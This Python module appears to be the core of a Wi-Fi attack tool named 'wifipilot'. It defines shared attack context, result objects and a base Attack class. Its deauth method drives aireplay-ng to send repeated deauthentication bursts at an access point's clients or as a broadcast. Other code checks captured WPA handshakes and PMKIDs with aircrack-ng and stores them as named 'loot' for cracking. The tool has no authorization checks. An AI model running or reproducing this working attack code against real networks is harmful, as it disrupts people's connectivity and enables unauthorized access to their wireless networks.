"""Attack framework: shared context, deauth support and result objects."""

from __future__ import annotations

import abc
import contextlib
import os
import time
from dataclasses import dataclass, field
from typing import Any, Callable, Dict, List, Optional

from ..config import Config
from ..deps import registry
from ..events import EK
from ..models import (STATUS_FAILED, STATUS_SKIPPED, STATUS_SUCCESS, AccessPoint,
                      Attempt, Capture)
from ..session import Session
from ..util import Process, clamp, mac_norm, run, safe_int

# --------------------------------------------------------------------------- #


@dataclass
class AttackOutcome:
    status: str
    result: str = ""
    detail: str = ""
    capture: Optional[Capture] = None
    deauths: int = 0
    extra: Dict[str, Any] = field(default_factory=dict)

    @property
    def ok(self) -> bool:
        return self.status == STATUS_SUCCESS

    @classmethod
    def success(cls, result: str, capture: Optional[Capture] = None, detail: str = "",
                deauths: int = 0, **extra) -> "AttackOutcome":
        return cls(STATUS_SUCCESS, result, detail, capture, deauths, extra)

    @classmethod
    def failed(cls, result: str, detail: str = "", deauths: int = 0, **extra) -> "AttackOutcome":
        return cls(STATUS_FAILED, result, detail, None, deauths, extra)

    @classmethod
    def skipped(cls, result: str, detail: str = "") -> "AttackOutcome":
        return cls(STATUS_SKIPPED, result, detail)


@dataclass
class AttackContext:
    """Everything an attack module is allowed to touch."""

    session: Session
    config: Config
    bus: Any
    iface: Any = None                 # InterfaceManager
    scanner: Any = None               # Scanner
    radio: Any = None                 # DemoRadio (demo mode only)
    demo: bool = False
    processes: Any = None             # ProcessManager
    stop_event: Any = None            # threading.Event, set on session stop

    # -- helpers -----------------------------------------------------------
    @property
    def monitor(self) -> str:
        if self.iface is not None and getattr(self.iface, "monitor", ""):
            return self.iface.monitor
        return self.config.monitor_interface or "mon0"

    def artifact_path(self, kind: str, ap: AccessPoint, ext: str) -> str:
        stem = f"{kind}-{ap.bssid.replace(':', '')}-{int(time.time())}"
        directory = os.path.join(self.session.state_dir, kind)
        os.makedirs(directory, exist_ok=True)
        return os.path.join(directory, stem + ext)

    def loot_name(self, ap: AccessPoint, kind: str) -> str:
        return f"{kind}-{(ap.essid or 'hidden').replace(' ', '_')}-{ap.bssid.replace(':', '')}"

    def log(self, message: str, level: str = "info", **extra: Any) -> None:
        self.bus.log(message, level=level, bssid=getattr(self, "_bssid", ""), **extra)

    def progress(self, label: str, **fields: Any) -> None:
        self.session.set_progress(label=label, **fields)

    def want_stop(self) -> bool:
        return bool(self.stop_event is not None and self.stop_event.is_set())

    def set_channel(self, channel: int) -> None:
        if self.demo or not channel:
            return
        if self.iface is not None:
            self.iface.set_channel(channel)

    # -- deauthentication --------------------------------------------------
    def deauth(self, ap: AccessPoint, count: Optional[int] = None, broadcast: bool = False,
               client: str = "", on_line: Optional[Callable[[str], None]] = None) -> int:
        """Send a deauth burst; returns the number of frames we asked for.

        In stealth mode this is a no-op: wifipilot becomes listen-only.
        """
        if self.config.stealth:
            self.log("stealth mode: skipping deauthentication", level="debug")
            return 0
        if "handshake" not in self.config.attacks and "wep_ivs" not in self.config.attacks:
            return 0
        count = count or self.config.deauth_count
        client = mac_norm(client)

        if self.demo:
            outcome = self.radio.deauth(ap.bssid, count=count, broadcast=broadcast)
            ap.deauths_sent += count
            self.session.stats.deauths += count
            self.bus.publish(EK.DEAUTH, {
                "bssid": ap.bssid, "sent": count, "client": client or "broadcast",
                "reconnected": outcome.get("reconnected", 0), "demo": True,
            })
            return count

        aireplay = registry.path("aireplay-ng")
        if not aireplay:
            self.log("aireplay-ng not available: cannot deauthenticate", level="warning")
            return 0
        self.set_channel(ap.channel)
        targets = [client] if client else (
            [c.mac for c in sorted(ap.clients.values(), key=lambda c: c.signal, reverse=True)[:2]]
            if not broadcast and ap.clients else []
        )
        sent = 0
        bursts = max(1, int(self.config.deauth_burst))
        for index in range(bursts):
            if self.want_stop():
                break
            target_list = targets or [""]
            for target in target_list:
                args = [aireplay, "--deauth", str(count), "-a", ap.bssid]
                if target:
                    args += ["-c", target]
                args += [self.monitor]
                result = run(args, timeout=25)
                sent += count
                if on_line and result.text:
                    on_line(result.text.splitlines()[-1] if result.lines else "")
                if result.error:
                    self.log(f"aireplay-ng error: {result.error}", level="warning")
                    return sent
                if "No such device" in result.text or "monitor mode" in result.text.lower():
                    self.log(f"aireplay-ng: {result.first_line()}", level="warning")
            ap.deauths_sent += count
            self.session.stats.deauths += count
            self.bus.publish(EK.DEAUTH, {
                "bssid": ap.bssid, "sent": count,
                "client": ", ".join(targets) or "broadcast",
            })
            if index < bursts - 1 and not self.want_stop():
                self._sleep(self.config.deauth_interval)
        return sent

    def _sleep(self, seconds: float) -> bool:
        """Interruptible sleep; returns False when the session was stopped."""
        deadline = time.time() + seconds
        while time.time() < deadline:
            if self.want_stop():
                return False
            time.sleep(0.2)
        return True

    # -- capture validation ------------------------------------------------
    def validate_capture(self, path: str, kind: str = "") -> "tuple[bool, str, Any]":
        """Verify a capture with our own parser, and with aircrack-ng when present."""
        from ..pcap import analyze_file
        analysis = None
        summary = ""
        try:
            analysis = analyze_file(path)
            if analysis.error:
                summary = analysis.error
            else:
                bits = []
                if analysis.has_handshake:
                    best = analysis.best_handshake()
                    bits.append(f"handshake(EAPOL {best.eapol_count if best else '?'})")
                if analysis.has_pmkid:
                    bits.append(f"PMKID x{len(analysis.pmkids)}")
                if analysis.wep_data:
                    bits.append(f"WEP data {analysis.wep_data}")
                summary = ", ".join(bits) or "no frames of interest"
        except Exception as exc:  # pragma: no cover
            summary = f"parse error: {exc}"

        valid = bool(analysis and analysis.valid)
        if self.config.check_handshakes and kind in ("handshake", "pmkid"):
            aircrack = registry.path("aircrack-ng")
            if aircrack and kind == "handshake":
                result = run([aircrack, path], timeout=45)
                if "No networks found" in result.text:
                    valid = valid and False
                if "0 handshake" in result.text:
                    valid = valid and False
                elif "handshake" in result.text:
                    valid = True
                if result.lines:
                    summary = f"{summary} | aircrack: {result.lines[-1][:80]}"
        return valid, summary, analysis


# --------------------------------------------------------------------------- #
# base class
# --------------------------------------------------------------------------- #


class Attack(abc.ABC):
    name: str = "attack"
    label: str = "Generic attack"
    tool: str = ""
    description: str = ""
    requires: tuple = ()              # capability flags from registry.capabilities()
    needs_injection: bool = True
    applies_to: tuple = ("WPA", "WPA2", "WPA2/WPA3", "WPA3", "WEP", "OPEN")

    def available(self, ctx: AttackContext) -> bool:
        if ctx.demo:
            return True                      # the simulated radio provides everything
        caps = registry.capabilities()
        return all(caps.get(flag, False) for flag in self.requires)

    def unavailable_reason(self, ctx: AttackContext) -> str:
        if ctx.demo:
            return ""
        caps = registry.capabilities()
        missing = [flag for flag in self.requires if not caps.get(flag, False)]
        return f"missing capability: {', '.join(missing)}" if missing else ""

    def applies(self, ap: AccessPoint) -> bool:
        return ap.encryption in self.applies_to

    @abc.abstractmethod
    def run(self, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
        ...

    # shared helper: finish an attempt with a capture
    def _succeed(self, ctx: AttackContext, ap: AccessPoint, attempt: Attempt,
                 kind: str, path: str, tool: str, result: str, detail: str = "",
                 deauths: int = 0, valid: bool = True, eapol: int = 0,
                 extra: Optional[Dict[str, Any]] = None) -> AttackOutcome:
        saved = ctx.session.save_artifact(path, kind, ctx.loot_name(ap, kind))
        capture = Capture(kind=kind, bssid=ap.bssid, essid=ap.essid, path=saved,
                          valid=valid, tool=tool, eapol=eapol,
                          size=os.path.getsize(saved) if os.path.exists(saved) else 0,
                          extra=extra or {})
        if os.path.exists(path) and saved != path:
            capture.extra.setdefault("raw", path)
        ctx.session.add_capture(capture)
        ctx.session.end_attempt(attempt, STATUS_SUCCESS, result, detail, capture)
        return AttackOutcome.success(result, capture, detail, deauths, **(extra or {}))

    def _fail(self, ctx: AttackContext, attempt: Attempt, result: str, detail: str = "",
              deauths: int = 0) -> AttackOutcome:
        ctx.session.end_attempt(attempt, STATUS_FAILED, result, detail)
        return AttackOutcome.failed(result, detail, deauths)
